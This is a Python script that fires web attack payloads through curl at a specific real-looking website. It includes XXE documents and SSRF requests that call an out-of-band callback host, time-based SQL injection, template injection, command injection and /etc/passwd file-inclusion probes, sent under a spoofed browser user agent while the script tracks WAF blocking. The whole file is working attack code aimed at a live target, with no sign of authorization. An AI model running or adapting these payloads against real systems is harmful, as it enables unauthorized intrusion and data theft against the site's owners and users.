import subprocess, time, sys
B = "https://www.infinitycapital.bh"
DOM = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"

def go(name, args, timeout=20):
    t0 = time.time()
    try:
        r = subprocess.run(["curl", "-sk", "-m", str(timeout), "-A", UA, "-o", "/tmp/o.bin",
                            "-w", "%{http_code} t=%{time_total} sz=%{size_download}", *args],
                           capture_output=True, text=True, timeout=timeout + 8)
        print("%-38s %s  wall=%.2f  err=%s" % (name, r.stdout, time.time() - t0, r.stderr.strip()[:60]), flush=True)
        return r.stdout
    except Exception as e:
        print("%-38s EXC %s" % (name, e), flush=True)
        return "EXC"

def main():
    print("=== BASELINE (everything should be 403 x-vercel-mitigated: deny if WAF-blocked)")
    go("GET /", [B + "/"])
    go("GET /api/", [B + "/api/"])
    go("GET /_next/image?url=..&w=128&q=75", [B + "/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2Fx.jpg&w=128&q=75"])

    print("=== XXE re-fire (fresh OOB host oobc6bf7c262315) — floor payloads never sent (curl exit 26)")
    doc = ('<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY x SYSTEM "http://oobc6bf7c262315.'
           + DOM + '/xxe-api"> ]>\n<r>&x;</r>')
    open("/tmp/x1.xml", "w").write(doc)
    open("/tmp/x1.svg", "w").write(doc)
    for ep in ["/api/", "/atom.xml", "/feeds/all.atom.xml", "/404"]:
        go("XXE raw POST " + ep, ["-X", "POST", "-H", "Content-Type: application/xml", "--data-binary", "@/tmp/x1.xml", B + ep])
    for ep in ["/api/", "/atom.xml"]:
        go("XXE multipart POST " + ep, ["-X", "POST", "-F", "file=@/tmp/x1.svg;type=image/svg+xml", B + ep])
    # SSRF-ish fetch sink: url= pointing at OOB
    go("SSRF /_next/image?url=oob", [B + "/_next/image?url=http%3A%2F%2Foobc6bf7c262315." + DOM + "%2Fssrf-img&w=1080&q=75"])
    go("SSRF /api/?url=oob", [B + "/api/?url=http%3A%2F%2Foobc6bf7c262315." + DOM + "%2Fssrf-api"])
    go("SSRF /api/ Host hdr", ["-H", "X-Forwarded-Host: oobc6bf7c262315." + DOM, "-H", "Referer: http://oobc6bf7c262315." + DOM + "/ref", B + "/api/"])

    print("=== SQLi time oracle (SLEEP) — expect identical ~instant 403 if WAF blocks before app")
    for i in range(2):
        go("base id=%d" % i, [B + "/api/?id=%d" % i])
        go("SLEEP id=%d" % i, [B + "/api/?id=1%27%20AND%20SLEEP(8)--%20-".replace("1%27", str(i) + "%27")])
    go("SLEEP /_next/image w", [B + "/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fa.jpg&w=1%20AND%20SLEEP(8)&q=75"])
    go("SLEEP /404 ?id", [B + "/404?id=1%27%20AND%20SLEEP(8)--%20-"])

    print("=== SSTI / cmd markers (should all be plain 403)")
    go("SSTI /api/?q={{7*7}}", [B + "/api/?q=%7B%7B7*7%7D%7D"])
    go("CMDI /api/?q=;id", [B + "/api/?q=%3Bid"])
    go("LFI /api/?file=/etc/passwd", [B + "/api/?file=%2Fetc%2Fpasswd"])

if __name__ == "__main__":
    main()
